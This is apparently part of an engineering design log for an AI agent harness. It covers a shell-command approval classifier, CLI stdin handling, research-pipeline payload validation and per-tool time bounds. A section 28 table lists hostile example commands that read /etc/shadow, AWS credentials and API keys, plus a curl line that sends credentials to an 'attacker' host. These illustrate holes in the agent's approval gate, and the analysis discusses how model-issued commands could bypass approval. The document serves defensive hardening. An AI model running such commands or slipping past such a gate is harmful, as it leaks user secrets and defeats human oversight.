| **T9** | A picker row leads with a **truncated first user message**. Beyond the stated ACs, and included because bug 2's actual complaint was that the picker could not be used: filtering makes it correct, and a list of timestamps and uuids is still not answerable. Read from the archive (T3's reasoning) and costing one extra query for the whole list, not one per row. |

### What this repeats, and must not

- **`ensure_columns()` is additive only** (M7) and explicitly never backfills. So every
  existing row takes `kind='chat'` from the default, and the hundreds of pass threads
  already in a user's database would still clutter the picker. That needs a **separate,
  idempotent one-time classification**, not a widening of `ensure_columns`' contract — if
  that function ever grows a `DROP` or a backfill, the project has outgrown it.
- **The classification signal is structural, not heuristic:** a thread created between a
  `PipelineRunRecord`'s `started_at` and `finished_at` is a pass thread of that run. A
  chat thread cannot be created in that window — the CLI is blocked inside the pipeline
  call, and the TUI's `_busy` guard already refuses `/new` and thread switching mid-run.
  A run with `finished_at IS NULL` (§22's abandoned-generator case, which deliberately
  leaves `status='running'`) has no closing bound, so **those threads stay `chat`**.
  Under-classifying leaves a straggler in the picker; over-classifying hides a real
  conversation, and only one of those is recoverable by the user.
- **`_param_digest` must not be copied.** §26 established redact-*then*-truncate because
  truncating first can cut a credential below the 20 characters its pattern needs. It is
  currently private to `orchestrator.py`; the replay renderer is its second caller, so it
  moves to a shared home beside `redact_secrets`. A second copy is how that ordering
  silently regresses in one of them — the project's canonical "fix at the producer" bug.
- **`ConversationMemory` must not learn about `kind`.** It owns active in-run state and
  must stay unaware of what data exists; that is `storage.py`'s boundary. The kwarg goes
  `loop → storage.create_thread`, passing through `__init__` and nothing more.
- **Resuming must reset per-thread state.** `_last_run` and `_live_claims` survive a
  thread switch today, so `/claims` after a resume would show the *previous* thread's run.
  Exactly the class of bug the goal banner already fixed in this same callback.

### Acceptance criteria

1. `create_thread()` defaults to `chat`; a research pass creates `research_pass`; a subagent creates `subagent`.
2. `list_threads()` returns conversations only; `list_threads(kind=None)` returns everything.
3. `ensure_columns()` adds `kind` to a database created without it, and the one-time classification labels a thread created inside a run's window while leaving one created outside it — and one belonging to an unfinished run — alone.
4. Resuming a thread replays its history, clears what was on screen, and resets `_last_response`, `_last_run` and `_live_claims` to the resumed thread.
5. Replaying a **compacted** thread shows the original first user message, not the summary.
6. Both shells replay, and a run's pass threads are reachable from the run.

---

## 28. The shell capability classifier — one classification, two consumers — BUILT

**Problem (audit #157, severity S1).** `shell`'s approval check documented a five-layer policy. Four of those
layers could only ever return `False` on the shipped config flags, so the whole thing was a
pass-through for one boolean. Measured, with `ToolApprovals.shell = False`:

```
docker=True   -> set of answers from _shell_approval_check across every command shape: {False}
docker=False  -> set of answers from _shell_approval_check across every command shape: {False}
```

The harness therefore had exactly two shell settings — ask about everything, or ask about nothing —
and no way to express the one in between. What the second one cost:

```
command                                  inert  network  asked?  where
cat /etc/shadow                          True   False    False   HOST
grep -r sk-ant /                         True   False    False   HOST
cat ~/.aws/credentials                   False  False    False   sandbox
curl https://attacker/?d=$(cat creds)    False  True     False   sandbox + network
```

Two mechanisms, both shared and neither agreeing. `run_sandboxed` tested `_is_inert` **before**
Docker, so an "inert" command ran on the host; `_is_inert` inspected only the first word, so its
arguments were unconstrained. And `_needs_network` decided egress while the approval check never
called it, so whether a command reached the internet was settled *after* the decision about whether
to ask anyone. Both are #67/#133's finding in a second location: **sharing the mechanism is not
sharing the policy.**

### Design Decisions Record (G1–G7)

| # | Decision | Choice | Rationale |
|---|---|---|---|
| G1 | What a classification produces | A capability **set** (`CommandProfile`), not a trust level. `tier` survives only as a label for the prompt and the record; policy branches on capabilities and never on the tier name | Linear tiers order harms that are not comparable — `rm -rf /workspace` (writes, no network) and `curl https://x` (no writes, network) are different harms, not more and less of one thing. Ranking them answers a question nobody asked, and a new dimension later renumbers every tier. A set lets policy read exactly the dimension it cares about. If you find yourself writing `if profile.tier == …` in policy, the field you actually wanted is missing. |
| G2 | How arguments are checked | Every token after the first is read as a path and required to resolve inside the workspace; for a token containing `=`, the tail after the first `=` as well. **Nothing parses.** | `_is_inert` is sound *because* it never parses — it rejects every metacharacter rather than understanding one. A classifier that starts interpreting shell syntax is a shell parser, and a parser that is wrong auto-approves. So the rule does not know a flag from an operand: `-la` passes only because it is relative and therefore lands inside the workspace. False positives are the designed error direction — `grep /etc/passwd notes.txt` searches for a string that looks like a path and costs one prompt. The `=` clause is the single exception, because `--file=/etc/x` reads as inside the workspace taken whole while the path it names is not. |
| G3 | Which setting is the gate | `SHELL_APPROVAL_MODE` (`always` / `tiered` / `never`), shipping **`tiered`**, with `ToolApprovals.shell` flipped to `False` and kept as the **ratchet** — `True` still forces `always` | These move together or neither means anything. `approval_needed` ORs the tool's own check with `requires_approval`, and **both** read `ToolApprovals.shell`, so while it was `True` the check could never lower the answer and `tiered` was unreachable dead code. The field stays because D24 requires it and because D14's one-way ratchet needs somewhere to live: config or an agent override can still only tighten. Exactly one thing gets looser than the pre-§28 default — read-only commands whose every argument is inside the workspace — and `ToolApprovals.read` is already `False`, so `read` on a workspace file was unprompted while `cat` on the same file prompted. That inconsistency goes away; everything else is unchanged or tighter. |
| G4 | What `tiered` auto-approves | INERT (read-only, workspace-scoped) and CONTAINED (Docker confirmed up, no network). HOST_READ, CONTAINED_NET and UNKNOWN ask | CONTAINED's damage ceiling is "corrupt the workspace", which `write` and `edit` already have unprompted (`ToolApprovals.write = False`), capped at 1 CPU / 1 GB / 200 pids / 60 s / no network / no host filesystem. Auto-approving only INERT would make `tiered` behave like `always` for real work, so users would set `never` and lose the whole benefit. Auto-approving CONTAINED_NET would be hole 2 renamed rather than closed — `_needs_network` matches the first word only, so `curl … \| sh` qualifies. |
| G5 | Where "we could not tell" lands | A separate `measured` field on the profile, gating all three containment branches | The `tier` label was standing in for this and could not carry it. Without the field, a call the classifier could not characterise is auto-approved *by the containment argument*, because every capability test passes vacuously on a profile that knows nothing — the exact vacuity class this audit keeps finding. It is also where batch 9's "the model is not sure" has to land, somewhere containment cannot argue it away. |
| G6 | Protecting `.venastine/` | A nested `:ro` bind mount, conditional on `.venastine` resolving **inside** the workspace **and** already existing | Both halves are load-bearing and both were measured. `.venastine/` resolves from the project path while the sandbox mounts `AGENT_WORKSPACE` (default `./workspace`), so in the default layout they are siblings and Docker cannot reach it at all — the mount matters only when someone points the workspace at a directory containing one. And Docker **creates** a missing bind source as a root-owned directory on the host: an empty `.venastine/` flips `is_trusted()` from `True` to `False` by itself, so an unconditional mount would conjure a directory and then make the harness prompt the user to trust it. Verified in a real container: `/workspace` writable, the subtree `EROFS`, `rm` and `mv` on the mountpoint refused with `EROFS` and `EBUSY`, reads unaffected. **Known limits:** writes on the Docker path only — not reads, not the subprocess fallback (which mounts nothing), not `agents/builtin` when the workspace is the harness repo. |
| G7 | `settings.json` | `shell_approval_mode` is rejected **by name**, with an explanatory message | R12's rule applied to a third kind of key, for R12's reason: the generic "unknown key" message reads as an oversight someone should fix by adding support. A project's `settings.json` beats the user's (D29) and arrives with a directory you cloned; this key decides whether shell commands are asked about at all. D17's trust prompt is not a substitute — the same prompt covers a README-shaped `CONTEXT.md`, and nobody reading it is deciding about their shell gate. Every value is rejected, including the tightening ones: the key is refused for where it can come from, not for what it says. |

### The rule, in full

```
containment = UNCONTAINED  if the tier is INERT or HOST_READ (the light path is a HOST subprocess)
              CONTAINED    if Docker is up
              UNCONTAINED  if the insecure fallback is enabled
              UNAVAILABLE  otherwise

auto-approved iff profile.measured and:
    CONTAINED     not profile.network
    UNCONTAINED   not (escapes_workspace or writes or network)
    UNAVAILABLE   never
```

One branch per containment rather than one predicate ANDed across all three, because the dimension
that matters genuinely differs. A container bounds the filesystem, so `escapes_workspace` says
nothing there — `cat /etc/passwd` in a container reads the container's. What a container does not
bound is egress, and that is precisely the half the pre-§28 gate never looked at.

**An approved HOST_READ still runs on the host.** Precedent decides it: `read` on a path outside the
workspace asks and then reads the real file. Approval exists to authorise the dangerous thing, and
routing an approved `cat /etc/passwd` into a container would answer a different question than the one
consented to. Hole 1 closes at the **gate**, not by rerouting.

**`never` is the pre-§28 loose configuration, preserved deliberately.** The fix for #157 is not that
it became unreachable — it is that reaching it now means writing the word `"never"`, rather than
switching off a field that reads like "stop nagging me".

### What the build found that the design did not

- **The gate sees raw model output.** `registry.approval_needed` is handed the tool-call input
  verbatim; `ShellParams` does not validate it until `run()`, which is *after* approval. So
  `command` can be a list, a dict, `None`. `command.strip()` on a list was an `AttributeError`
  escaping the approval check and then the loop — unreachable before only because
  `ToolApprovals.shell` defaulted `True` and returned first. `classify_command` is total now, and
  that is a **requirement**, not defensiveness.
- **`auto_approved(…, UNAVAILABLE)` returning `False` means ASK.** Not "do not ask". The two
  polarities meet in `_shell_approval_check` and needed an explicit branch; the plan and the
  docstring had both claimed the generic rule could carry the second meaning.
- **#50's other half.** A missing CWD is `FileNotFoundError` on POSIX — caught, then misreported as
  "Command not found" — but `NotADirectoryError` on Windows, which is an `OSError` and **not** a
  `FileNotFoundError`, so it escaped the handler entirely. Both backends catch `OSError` now.
- **The drive-letter escape is Windows-only**, found by the Linux container. `os.path.join` on POSIX
  reads `C:/Users/x` as a relative directory named `C:`, so it stays inside the workspace — and it
  should, since it names nothing outside it there.

### Deliberately not in §28

Model-based judgement is batch 9, and one ordering property is recorded now so §28 does not
foreclose it: **the deterministic classifier runs first and anything compound is `UNKNOWN`, so the
model never sees compound shell.** Its input would be a single command, no metacharacters, not on an
allowlist. Routing complex commands to it later to reduce prompts collapses the injection argument
entirely. It also needs a ceiling — "certain safe" must not authorise a host read — which would make
it the first layer in the harness that **widens** rather than tightens, breaking D14's one-way
ratchet. That has to be a named decision rather than an implication.

Also not built: a second enforcement point inside `_run_inert` (it cannot see whether the call was
approved, so it would break approved HOST_READ calls to re-block what the gate already handled), and
`write` / `edit` / MCP profiles (the policy layer is generic so they extend additively; building them
now would be speculative).


## 29. The CLI shell — one reader, one channel, one entry point — BUILT

**Problem (audit #100, severity S1).** `_StdinReader`'s docstring names the hazard, for the case it fixed:

> `input()` cannot be interrupted, and **spawning a reader per prompt would leave several threads
> racing for the same stdin** after the first timeout — whichever won would answer the wrong question.
> One long-lived daemon reader with a queue keeps that single-threaded.

It keeps the *reader* single-threaded. It does not stop `input()` from being a second reader, and
§21b's M16 is what put both in one process: before it, CLI chat had no `ApprovalProvider`, so no pump
thread was ever started in a session whose main loop reads stdin with `input()`.

```
run_chat            -> build_chat_authorization() -> build_attended_provider()
                                                  -> _stdin_reader()   (thread not yet started)
first gated call    -> reader.ask()   -> Thread(_pump).start()
                                      -> `for line in sys.stdin` — runs forever, daemon
next turn           -> run_chat's input("You: ")   <-- contends with the pump
```

The pump wins, takes the line, and `input()` waits for one that will never come. Silent, and
indistinguishable from the model thinking. Live on the default path: `ToolApprovals.remember` and
`spawn_subagent` both ship `True`.

Four more issues live in the same file, and #102 names what connects them: **there was no `main()`**.
Lines 1310–1425 sat under `if __name__ == "__main__":`, so nothing in the startup sequence was
importable — while `build_parser`'s docstring claimed it had been *"separated from `main()` so tests
can exercise argument parsing without side effects"*, naming a function that did not exist.

### Design Decisions Record (N1–N8)

| # | Decision | Rationale |
|---|---|---|
| N1 | **Every stdin read in `main.py` goes through the one `_StdinReader`.** It gains `readline(prompt)` — blocks, keeps type-ahead. `ask(prompt, timeout=None)` keeps the drain. `_ask` becomes a wrapper over `readline`. | Two methods, not a `drain=` flag. The drain is a *safety property* — "a line typed after a question timed out was answering THAT question" — and a keyword argument that switches it off is one call site away from being passed at an approval prompt. `readline` must **not** drain for the mirror-image reason: a line typed while the model was streaming is an answer to the prompt about to appear, which the terminal line-buffers and `input()` returned immediately. Draining it would trade a loud bug for a quiet one. The other `_ask` callers were safe only because `setup_mcp` happens to run before `run_chat` — an ordering coincidence between two functions, not a property anyone stated, and it breaks the first time a startup prompt moves. Pinned by a test that allows no live `input(` in the module. |
| N2 | **The deadline belongs to the channel, not the kind.** `ask`'s timeout defaults to `None`; `build_attended_provider(..., timeout=…)` supplies it, and `--init` builds one with `timeout=None`. The `(600s)` suffix renders only when there is a deadline. | What decides whether a prompt may expire is whether there is a **run waiting on the answer**. Letting the branch decide gets it wrong in both directions: a startup prompt would expire on someone who stepped away mid-decision, and a future mid-run `CONFIRM` would block the run forever — #100's own defect, in the section that fixes #100. The default is a **sentinel**, not the config constant: a plain `timeout=config.ATTENDED_APPROVAL_TIMEOUT_S` default is evaluated at **import**, which silently defeats `conftest`'s `shrink_approval_timeout` and its stated "read at call time" contract — the fixture that makes an unanswered prompt fail the suite instead of stalling it for ten minutes. Verified by diffing the rendered prompt strings before and after: the four run-backed prompts are byte-identical. |
| N3 | **EOF is published as a latch as well as a sentinel, and on the exception path too.** | Neither half was in the plan and both are load-bearing. `for line in sys.stdin` ending is invisible to a queue consumer, so Ctrl+D would have hung where `input()` raised `EOFError` — the fix for a wedge being a different wedge. It is a **latch** because `ask`'s drain would otherwise swallow a lone sentinel and strand every later reader, which `_confirm_user_level_servers` reaches: it reads once per pending server. And the pump must publish EOF when it **raises**: under pytest's capture, reading `sys.stdin` raises, the pump died, nothing published anything, and the suite hung. That was harmless before only because every read carried a deadline. |
| N4 | **Kind dispatch is a `{kind: handler}` table, pinned against `interaction.SAFE_DEFAULTS`.** | Audit #7. A kind with no branch falls through `ask` to `None`, which `decode` turns into that kind's declining default — silently, on every CLI run, while looking wired up. `SAFE_DEFAULTS` is already the canonical registry, since `decode` raises on anything absent from it, so a seventh kind fails at CI. The parity test is **behavioural** rather than a set comparison: what makes a kind supported is that a human is actually put the question, and a branch that returns without asking is exactly the defect. A runtime `WARNING` would fire only once someone reached the branch — the condition that went unnoticed for two sections. |
| N5 | **CLI `--init` goes down that channel — on a tty only.** On a pipe it still passes `confirm=None`. | Not new design: §23 slice 1 states it — *"generate()'s confirm/choose_kind parameters are unchanged, they are a shell-agnostic API **the CLI implements too**"* — and moved the TUI. The CLI was the half never moved, and kept two guards written by hand. It also makes N4's new branches live rather than reachable only from a test. The tty condition is the trap: `generate` reads `confirm=None` as *"report what you WOULD write without writing it"* (I5/V6), which is **not** the same answer as a channel that declines. The `CHOICE` renderer reads the payload the TUI already sends, so `s` means software by unique prefix rather than by hard-coding `/init`'s vocabulary into the channel, and a bare Enter still takes the suggestion because `proposal` is on the payload. |
| N6 | **`create_db_and_tables()` and `configure_logging()` move below `parse_args()`; `_classify_legacy_threads()` moves below the early-exit commands.** | Audit #101. `--help` and a typo'd flag exit *inside* `parse_args`, and both created a 77 KB six-table SQLite database and a log directory in whatever directory they ran from. The file already made this argument one level down, about MCP: *"argument validation before connecting anything: `parser.error()` exits, and doing it after `setup_mcp()` would spawn stdio server subprocesses only to abandon them on the way out."* #101's own text is wrong about the rest, and the fix is smaller for it — it lists `--memories`/`--summary`/`--init` as needing no schema, but all three do, `--init` because it runs a real model turn that logs messages. So this is one relocation, not an `_ensure_storage()` a new path can forget to call. The sweep goes further down because it exists to keep the **thread picker** uncluttered and none of the early exits shows one, while #82 measured it at 441 ms on a 2000×2000 database, per launch. |
| N7 | **`main(argv=None) -> int`.** | The enabling change #102 names. `SystemExit` still propagates rather than being converted — `parser.error` raises it with code 2 and `run_research` with code 1 — so this returns a code only where it decides one. |
| N8 | **`--review` and `--no-review` join the research-only guard** (`args.review is not None`). | Audit #141. They are documented exactly like their three siblings — `--help` renders both as *"Research mode: …"* — and were not in the condition, so `resolve_review()` computed a value `run_chat` has no parameter for and nothing was said. The guard's own comment already covers them verbatim: *"silently widening chat is not what a flag documented for research should do."* Both spellings, because refusing one while tolerating the other makes the guard a special case instead of a rule. |

### Measured, before and after

```
#100, under a real pty (Linux; Windows has no pty module)
  before  (input)      APPROVAL_GOT='y\n'   CHAT_GOT never printed -- the read never returned
  after   (readline)   APPROVAL_GOT='y\n'   CHAT_GOT='the next question'
  Ctrl+D  (readline)   CHAT_EOF             -- N3: the exit route survives

a real SIGINT into a wait with no deadline (Linux)
  input()          [pre-N1]     KeyboardInterrupt after 0.40s
  queue.get()      [post-N1]    KeyboardInterrupt after 0.40s
  queue.get(t=30)  [ask]        KeyboardInterrupt after 0.40s

#7, does the CLI put the question to a human?
  kind               before          after
  approval           yes             yes
  subagent_signoff   yes             yes
  question           yes             yes
  review             yes             yes
  confirm            NO, decoded False    yes
  choice             NO, decoded None     yes

#101, a fresh empty directory
  before  python main.py --help    -> app.db (77824 bytes), logs/     exit 0
  after   python main.py --help    -> nothing at all                  exit 0
          python main.py --notaflag -> nothing at all                 exit 2

N2, the four run-backed prompts: byte-identical (diff of the rendered strings is empty)
```

### What the build found that the design did not

- **The pump had no error handling, and that stopped being survivable.** Under pytest's capture,
  reading `sys.stdin` raises. The pump died, nothing published EOF, and `readline` waited forever —
  the suite hung rather than failed. Before §29 every read carried a deadline, so a dead pump merely
  meant the deadline fired. Taking the clock off one path turned a tolerated failure into a
  permanent one, which is the general shape worth remembering: *a timeout can be load-bearing
  without anyone having decided it was.*
- **EOF has to be a latch, not just a sentinel.** `ask`'s drain consumes anything queued, including a
  lone sentinel, so the reader after it blocks forever. `_confirm_user_level_servers` reads once per
  pending server, so a piped run with two of them reaches this.
- **A default argument evaluated at import silently defeated a fixture.** `conftest`'s
  `shrink_approval_timeout` documents "read at call time, so patching the module attribute is
  enough". Putting `config.ATTENDED_APPROVAL_TIMEOUT_S` in a default argument takes that away without
  changing anything visible; the fixture keeps passing and stops doing its job.
- **Ctrl+C on Windows is not a regression, and it took measuring to say so.** A reader parked with no
  deadline is not woken by `_thread.interrupt_main()` — but neither is `input()`, and neither is
  `ask`'s long-standing timed wait. Under a real console control event all three exit identically
  with `STATUS_CONTROL_C_EXIT`. The plan had a poll-loop fallback ready for a regression that
  measurement showed does not exist.
- **`run_init_command` had no test at all**, which is why migrating it onto the channel broke
  nothing.

### Deliberately not in §29

- **#57 and #76**, the two remaining S1s. Each needs a layer designed before it can be written — a
  cross-platform tool wall clock, and a pipeline shape-validation policy that has to interact with
  §3's retry.
- **#8, the CLI slash-command layer.** N1 is the enabling change for it — a single-reader `run_chat`
  is what a command dispatcher reads through — but adding commands is its own section.
- **A way for a gated prompt to extend its own deadline.** N2 makes "no deadline" expressible, which
  is what `--init` needed. A mid-run prompt that lets you ask for more time is a different feature and
  needs a decision about what an unattended run does with it.

## 30. The pipeline's payload boundary — one shape check for the ten passes — BUILT

**Problem (audit #76, severity S1).** §3's retry corrects a response that does not **parse**. Nothing checked
that what parsed was the **shape** the pass promised, so the same defect appeared in six places at
once, and two of them completed a run and reported a false outcome.

Driven end to end against the real `stream_deep_research_pipeline`, one override per run, everything
else answering correctly:

| what the pass returned | outcome before |
|---|---|
| Pass 2 wraps its list: `{"claims": [...]}` | `AttributeError: 'str' object has no attribute 'items'` |
| Pass 2 omits `id` | `TypeError: Claim.__init__() missing 1 required positional argument: 'id'` |
| Pass 3c returns a list of gaps | `AttributeError: 'list' object has no attribute 'get'` |
| Pass 0 returns a bare list | `AttributeError: 'list' object has no attribute 'get'` |
| Pass 3b returns `severity` as a string | `TypeError: unsupported operand for -: 'float' and 'str'` — **raised in Pass 4**, two passes later |
| Pass 6a omits `revised_text` | `KeyError: 'revised_text'` |

Not one names the pass, the field, or the expected shape. `{"claims": [...]}` is the single most
likely way a model deviates here and it produces an error about `str.items`, because
`run.claims = [_claim_from_json(c) for c in claims_json]` iterates a dict's **keys**.

**The silent half is the reason this is S1.** Two shapes complete successfully:

```
Pass 5 answers with the flags at the top level  ({"C1": [...]} instead of {"per_claim_flags": {...}})
  -> a FINISHED run, and the trace line:
     "Pass 5: assumption audit complete, 0 claim(s) flagged."     <- the line a CLEAN run gets

Pass 3a/3b answer about ids Pass 2 never issued ("1", "2" instead of "C1", "C2")
  -> a FINISHED run, every claim grounding=None, under:
     "Pass 3a: grounded 4 unique entities across 3 factual claim(s)."
     "D1: 3 claim(s) flagged for revision, 0 already clean."
  then four more model calls in the 6a/6c loop, and a report saying nothing could be verified.
```

The checkpoint lines report the **input**, not the effect — `len(unique_entities)` and
`len(factual_claims)` are the counts the pass was *asked* about, so the line is emitted verbatim
whether every entry applied or none did. `base.py` calls the trace *"at least as trustworthy an
artifact as the final report itself"*, and here it is the reason nothing looks wrong.

### §20 already built this validator

`review.py:_validated` checks a top-level type, the required keys per entry **with type guards
before the membership tests**, an id cross-check against `{c.id for c in run.claims}`, an enum, and a
duplicate — and was built once, for the one payload that is **not** a pass. This is §29's #7 with
different nouns: the mechanism exists, one consumer got it, the other nine never did.

What §30 takes is that **shape** and not its **policy**. A finding the reviewer cannot apply is
dropped and traced, because the review stage is optional and contained and a misfiring reviewer must
not cost a completed ten-pass run. A pass is not optional, so a payload it cannot apply re-enters
§3's corrective retry and ultimately raises. Same shape, two policies; merging them means choosing
one, and neither is wrong for its own caller.

### Decisions

| # | Decision | Rationale |
|---|---|---|
| **B1** | **One payload boundary for the ten passes**, in `core/reasoning/payload_validation.py`: a declarative `{pass_id: Spec}` table, one `validate(pass_id, payload, claim_ids=None, ensemble=False)`, and `PayloadShapeError(ValueError)`. `review.py` is **not** migrated onto it (comment only). | The same defect appeared in six places because no layer asserted shape at all. A new module rather than the orchestrator, for `json_retry.py`'s own stated reason: a mechanism a second consumer might want must not be trapped there. Migrating §20's reviewer would rewrite a tested boundary feeding the human-consent path, in a batch about the passes — recorded as deliberately deferred rather than forgotten. |
| **B2** | **A shape or value failure re-enters §3's corrective retry.** `retry_until_json` gains `validate=`; exhaustion raises. **The corrective wording branches.** | The conversation is the same one — the model's own output is already in the thread. But *"your last response did not parse as valid JSON"* is **false** about a payload that parsed perfectly and was the wrong shape, and a model told its JSON is malformed when it is not has nothing to fix and will most likely resend the same structure. The trace branches too: a reader scanning for `JSON parse failed` is scanning for a model that cannot emit JSON, which is a different fact. |
| **B3** | **`_run_pass_with_json_retry` keeps returning `str`,** and binds the spec itself from the pass id rather than taking it from each call site. | Two findings from reading. **Around twenty test sites** patch or drain that function and assert on the returned string, and §20's reviewer shares `retry_until_json`'s contract — re-parsing a short string is cheaper than moving twenty seams in the batch that adds the check. And a call site that *forgot* a `validate=` argument would be silently unvalidated, which is the condition this section exists to remove; `validate()` raises on a pass id it has no spec for, so an eleventh JSON-emitting pass cannot arrive by omission. |
| **B4** | **Three properties per spec, plus a declared type where a value is used arithmetically**: the top-level type, the required keys per entry, and that entry ids resolve. | Each has a demonstrated consequence in the table above and nothing else does. Not a schema language and no new dependency (#145 tracks those): a richer vocabulary would let a spec describe things no pass has ever got wrong, at the price of a second place where a payload's meaning lives. |
| **B5** | **A total id mismatch is the error; a partial one applies what matched and is reported.** The three `_apply_*` return how many claims they touched, and four checkpoints interpolate that. | Turns the second silent case into a named failure without letting one stray id kill a run that has already paid for nine passes. **The exception comes from the prompts:** `assumption_audit.md` asks the model to omit unflagged claims and `completeness.md` allows no gaps, so an empty `per_claim_flags`/`gaps` is the ordinary answer for a clean run — Pass 5's demonstrated defect was the top-level key being *absent*, which B4 catches instead. |
| **B6** | **A duplicate claim id is rejected at Pass 2's boundary, and the two id lookups collapse onto `base.resolve_by_id`** (first wins). | `_apply_grounding`/`_apply_critic` built `{c.id: c}` (last wins) while `_apply_assumption_flags`/`claim_by_id` used `next(...)` (first wins). Driven, that split one claim in half: `first` carried the flags and no grounding, `second` carried grounding and severity and no flags — so D1 flagged the ungrounded copy and 6a revised the one with no sources. Rejecting the payload stops it arriving; unifying the lookups protects claims built by paths that never go through Pass 2 (§20's corrections, a future resume). |
| **B7** | **`asserted_by_candidates` gets three layers.** `claim_extraction.md` now asks for it on every claim in ensemble mode; the Pass 2 spec requires it there; and `score_claim` treats an **empty list as unreported** — `consistency_score: None`, no penalty, traced. | The prompt scoped the field to multi-candidate claims, so a claim one candidate raised uncontested had it **absent** — and `len([]) / n` is 0.0, the *maximum* 0.15 penalty, for a claim that exists because a candidate asserted it. One line each, and only the last is enforceable: a prompt is a request. |
| **B8** | **The numerator is deduplicated and clamped, and a clamp is recorded.** `min(1.0, len(set(...)) / ensemble_n)`, with the unclamped value kept as `consistency_reported`. | `[1, 2, 3, 3]` made consistency 1.3333, so the penalty went **negative** and was subtracted — a MEDIUM claim scored HIGH off a duplicate, against the property E8's own comment says holds "by construction". Recorded rather than silent because a numerator above the denominator is itself evidence Pass 2 misread the candidate labelling, and clamping quietly destroys the evidence along with the bug. |
| **B9** | **`grounding_status` and `type` are validated in the spec, and coerced to the conservative end if one reaches the scorer anyway.** | `base.py`'s `Literal`s are annotations; dataclasses do not enforce them. An unrecognised status took `GROUNDING_WEIGHTS`' 0.0 default — the same *number* as ungrounded — but the forced-UNVERIFIED rule compares `== "ungrounded"`, so it **escaped**: `'Ungrounded'` published a claim the model could not source as merely LOW. `'Factual'` skipped D0's routing entirely and then sat on `NON_FACTUAL_SCORE_CAP`, scoring MEDIUM. Both are rejected at the boundary now; the coercion is the last resort for a value that survived the retries, and it is traced, because Pass 4 makes no model call and a value it worked around has nowhere else to surface. |
| **B10** | **`score_breakdown` records what was applied and names the branch.** Both branches reconstruct `raw_score` from their own fields. | `if consistency_score is not None:` was true for every claim on an ensemble run, so a non-factual claim stored a `disagreement_penalty` E9 never subtracts — a reader recomputing from the stored fields got **0.25** against a stored **0.65**. Same class as E10 on the same object. `grounding_component`, inert on a claim D0 routes past 3a and recorded there since before ensemble mode, is replaced by the capped critic term the formula actually used; `consistency_score`/`consistency_denominator` survive as the raw signal E12 and #12 want. |
| **B11** | **The spec table is pinned against the call sites**, by a test that reads `orchestrator.py`'s source, in both directions — plus one that every id-checking spec's call site passes `claim_ids=`. | §29's N4 lesson: a missing entry must be **loud at CI**, not a runtime warning that fires only once somebody reaches the branch. A spec that declares an id check and receives `None` is switched off without failing anything, which is the same silence one level down. |

### Stated limit, not fixed

Every spec is a transcription of the `Respond with ONLY this JSON structure` block in that pass's own
`.md`, and **nothing checks that the two still agree**. A prompt edit that renames a field fails the
run rather than silently mis-applying it — the better failure — but it fails it at the model's
expense. Recording that is better than a check that would have to parse eight markdown files to
mean anything.

### Verification

Windows **1914 passed / 16 skipped / 1 deselected**; `python:3.11-slim` **1929 / 1 / 1**; 1931
collected on both. `main.py --help` exit 0 and `import tui.app` on both platforms.

**34 mutations, 33 red on a test named for each, one green control, tree clean after restore** — and
the whole table re-run inside the container, where six of the Windows skips are live. Two survivors,
both in the tests rather than the code, and both are the vacuity class this project keeps meeting:

| survivor | why it survived |
|---|---|
| the enum branch's type guard deleted | the only unhashable-value test aimed at `claim_id`, which `entry_types` checks first — so the rule copied from `review.py` **by name** was asserted in a comment and nowhere else |
| the numerator's `set()` deleted | **the clamp was masking the dedupe.** `[1, 2, 3, 3]` without dedupe is 4/3, which the clamp pulls back to exactly the deduped answer. Two guards overlapping on the one input the test used. The discriminating case is a repeat that stays *below* the denominator: `[1, 1]` out of 3 is 1/3 deduped and 2/3 raw |

The control earned its keep on the same run: it came back RED once, from the documented test count
drifting behind two newly added tests — not from the mutation. That is the false-RED class the
harness exists to separate.

### Deliberately not in §30

- **#57**, the tool wall clock — the last severity-S1 finding after this. `signal.alarm` is main-thread-only, the TUI
  runs tools in a worker, and abandoning a thread mid-`sympy` leaks one nothing can join. That is a
  decision about process isolation, and its fix site is on every tool call in the project.
- **#77**, keeping the ensemble candidates on `PipelineRun`. B8's recorded clamp is a partial answer
  — a numerator above the denominator is visible now — but the fix adds a field, new artifact files,
  and `pipeline_storage` + TUI reads.
- **Migrating `review.py:_validated` onto B1's module.** `json_retry.py`'s own docstring is the
  argument for doing it; the counter-argument is B1's. The comment naming the shared shape is there
  so the next reader finds both.
- **#12**, routing disagreement rather than scoring it. B8 and B10 make the signal trustworthy and
  self-describing, which is what #12 says it would read; what to *do* with it is unchanged.

---

## 31. What a tool call is allowed to cost — one declared bound per tool — BUILT

**Problem (audit #57, severity S1 — the last one in the project).** `registry.dispatch` was
`result = spec.handler(params, **injected)`. No timeout, no alarm, no signal machinery anywhere
between the model and the handler, and the arguments come from the model.

Reproduced during this batch, each probe in its own subprocess with an external budget:

```
symbolic_math series order=100,000              >8s   STILL RUNNING -- killed
discrete_math combinations n=1e7 r=1e6          >8s   STILL RUNNING -- killed
discrete_math factorial n=100,000              0.46s  ValueError: Exceeds the limit (4300 digits)
```

That third line is **not** a bound. The traceback lands in `sympy/printing/str.py:_print_Integer` —
CPython's int→str limit firing at **serialisation**, after the work is done. `n=1,000,000` never
reaches it. It is an accident that looks like a control, which is the most expensive kind.

`discrete_math` declares seven `Optional[int]` fields with no `ge`/`le` at all; `symbolic_math.order`
is `ge=1`, a floor on the one parameter that costs. `linear_algebra`, `probability_stats`, `geometry`
and `logic` have no numeric bounds either.

### The mechanism existed three times over and reached none of the built-ins

| where | what it already did |
|---|---|
| `mcp_client/client.py:300-333` | A **two-layer wall clock with the rationale written out** — `read_timeout_seconds` cancels the request, `future.result(timeout=)` is the backstop *"for the case the [answer] is never coming at all"*. Every MCP tool bounded at 180s |
| `security/sandbox.py:573`, `:540` | `subprocess.run(timeout=SANDBOX_TIMEOUT_SECONDS)` plus `RLIMIT_CPU` + `RLIMIT_AS` — on `shell`, the one tool globally denied |
| `fetch_url`, `arxiv`, `web_search` | Each carries its own `REQUEST_TIMEOUT_S` |

So every bound in the tool layer was per-tool and voluntary, and the six in-process math tools — the
only ones that can burn a core indefinitely — were the ones that opted out. That is §29's #7 and
§30's `_validated` a third time: the mechanism is built, one consumer got it, the rest never did.

### The deferral reason assumed a thread

Batch 10 set #57 aside on stated grounds: *"`signal.alarm` is main-thread-only, the TUI runs tools in
a worker, and abandoning a thread mid-`sympy` leaks one that nothing can join."* Every clause is
true, and together they are an argument against the **thread**, not against the bound. A prototype
settled it:

```
gcd a=462 b=1071                        0.35s  {"result": "21", "operation": "gcd"}
symbolic_math series order=100000       3.02s  KILLED at the wall clock
discrete_math combinations n=1e7 r=1e6  3.01s  KILLED at the wall clock
```

